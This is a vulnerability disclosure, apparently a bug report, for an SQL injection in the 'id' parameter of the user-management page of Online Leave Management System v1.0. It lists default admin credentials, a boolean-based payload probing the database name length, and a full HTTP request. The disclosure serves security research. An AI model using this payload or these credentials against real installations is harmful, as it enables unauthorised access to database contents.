# Online Leave Management System v1.0 by oretnom23 has SQL injection

BUG_Author: SunQingYu

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/14910/online-leave-management-system-php-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /leave_system/admin/?page=user/manage_user&id=

Vulnerability location: /leave_system/admin/?page=user/manage_user&id=,id

dbname=leave_db,length=8

[+] Payload:  /leave_system/admin/?page=user/manage_user&id=12%27%20and%20length(database())%20=9--+ // Leak place ---> id

```sql
GET /leave_system/admin/?page=user/manage_user&id=12%27%20and%20length(database())%20=9--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=a58hbbkeelngug4ek0dssb0rb5
Connection: close
```

length=8
![image](https://user-images.githubusercontent.com/54017627/183634674-8553d179-5886-43e9-b868-9b5390172bb3.png)


length=9
![image](https://user-images.githubusercontent.com/54017627/183634615-bfadf99d-9798-42f2-834c-0581df1f5591.png)

